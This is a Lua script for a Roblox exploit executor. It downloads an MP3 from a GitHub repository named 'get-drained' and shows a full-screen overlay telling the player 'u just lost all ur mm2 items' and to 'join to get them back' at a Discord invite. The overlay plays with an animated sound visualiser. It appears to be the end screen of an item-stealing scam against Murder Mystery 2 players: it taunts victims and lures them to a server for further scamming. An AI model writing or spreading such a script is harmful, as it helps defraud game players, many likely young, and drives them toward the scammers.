local SOUND_URL = "https://github.com/todyaramello/get-drained/raw/refs/heads/main/mascara.mp3"

local function doRequest(options)
	if request then return request(options) end
	if http_request then return http_request(options) end
	if syn and syn.request then return syn.request(options) end
	return nil
end

local cached = false
pcall(function()
	if readfile("mascara_cached.txt") == "ok" then
		cached = true
	end
end)

local asset
if cached then
	asset = getcustomasset("mascara.mp3")
else
	local res = doRequest({Url = SOUND_URL, Method = "GET"})
	writefile("mascara.mp3", res.Body)
	writefile("mascara_cached.txt", "ok")
	asset = getcustomasset("mascara.mp3")
end

local sg = Instance.new("ScreenGui")
sg.Name = "thanks"
sg.DisplayOrder = 999
sg.ResetOnSpawn = false
sg.Parent = gethui()

local BAR_COUNT = 50
local BAR_WIDTH = 6
local BAR_GAP = 2
local totalWidth = BAR_COUNT * (BAR_WIDTH + BAR_GAP)

local bg = Instance.new("Frame")
bg.Size = UDim2.new(0, totalWidth + 40, 0, 320)
bg.Position = UDim2.new(0.5, 0, 0.5, -20)
bg.AnchorPoint = Vector2.new(0.5, 0.5)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BackgroundTransparency = 0.4
bg.BorderSizePixel = 0
bg.Parent = sg

local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(0, 12)
bgCorner.Parent = bg

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0.5, 0, 0, 10)
title.AnchorPoint = Vector2.new(0.5, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Text = "u just lost all ur mm2 items :("
title.TextSize = 24
title.Font = Enum.Font.GothamBold
title.Parent = bg

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 30)
subtitle.Position = UDim2.new(0.5, 0, 1, -40)
subtitle.AnchorPoint = Vector2.new(0.5, 0)
subtitle.BackgroundTransparency = 1
subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
subtitle.Text = "join to get them back discord.gg/t6P39xHhXB"
subtitle.TextSize = 16
subtitle.Font = Enum.Font.Gotham
subtitle.Parent = bg

local bars = {}
for i = 1, BAR_COUNT do
	local bar = Instance.new("Frame")
	bar.Size = UDim2.new(0, BAR_WIDTH, 0, 0)
	bar.Position = UDim2.new(0.5, -totalWidth / 2 + (i - 1) * (BAR_WIDTH + BAR_GAP), 1, -50)
	bar.AnchorPoint = Vector2.new(0, 1)
	bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	bar.BorderSizePixel = 0
	bar.Parent = bg
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 2)
	corner.Parent = bar
	bars[i] = bar
end

local dragging, dragInput, dragStart, startPos
bg.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = bg.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)
bg.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)
game:GetService("UserInputService").InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		bg.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

local sound = Instance.new("Sound")
sound.SoundId = asset
sound.Volume = 1
sound.Looped = false
sound.Parent = sg
sound:Play()

task.spawn(function()
	local seeds = {}
	for i = 1, BAR_COUNT do
		seeds[i] = {math.random() * 10, math.random() * 10, math.random() * 6 + 2, math.random() * 6 + 2}
	end
	while sound.Playing do
		local t = tick()
		for i = 1, BAR_COUNT do
			local s = seeds[i]
			local w1 = math.sin(t * s[3] + s[1] * 3) * 0.5 + 0.5
			local w2 = math.cos(t * s[4] + s[2] * 2) * 0.3 + 0.5
			local w3 = math.sin(t * 1.8 + i * 0.7) * 0.2 + 0.3
			local height = math.clamp((w1 * w2 + w3) * 180, 4, 200)
			bars[i].Size = UDim2.new(0, BAR_WIDTH, 0, height)
		end
		task.wait()
	end
end)

sound.Ended:Wait()
task.wait(1)
sg:Destroy()
